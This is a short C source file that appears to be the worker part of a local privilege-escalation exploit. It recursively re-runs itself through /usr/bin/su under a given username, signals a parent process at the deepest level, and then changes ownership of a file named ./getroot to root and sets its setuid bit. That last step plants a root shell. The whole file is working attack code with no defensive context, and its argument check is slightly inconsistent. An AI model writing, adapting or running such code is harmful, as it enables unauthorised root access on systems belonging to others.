#include <unistd.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

void spawn(char *username, pid_t ppid, unsigned int current, unsigned int limit) {
  char *args[5];
  char cmd[255];

  snprintf(cmd, sizeof(cmd), "./elevate_worker %s %d %d %d", 
                      username, ppid, current, limit);
                    
  args[0] = "/usr/bin/su";
  args[1] = username;
  args[2] = "-c";
  args[3] = cmd;
  args[4] = NULL;
  execv("/usr/bin/su", args);
}

int main(int argc, char **argv, char **envp) {
  pid_t pid;
  pid_t ppid;
  int status;
  unsigned int limit;
  unsigned int current;
  char *username;

  if (argc < 3) {
    printf("Usage: ./elevate_worker {username} {ppid} {n} {limit}\n");
    return 1;
  }

  username = argv[1];
  ppid = atoi(argv[2]);
  current = atoi(argv[3]);
  limit = atoi(argv[4]);

  if (current < limit) {
    pid = vfork();

    if (pid == 0) {
      spawn(username, ppid, ++current, limit);
    } else {
      wait(&status);
    }
  } else {
    printf("[+] Signalling parent...\n");
    kill(ppid, SIGUSR1);
    printf("[+] Waiting for 5s...\n");
    sleep(5);
  }

  chown("./getroot", 0, 0);
  chmod("./getroot", S_IRWXU | S_IRWXG | S_IRWXO | S_ISUID);

  return 0;
}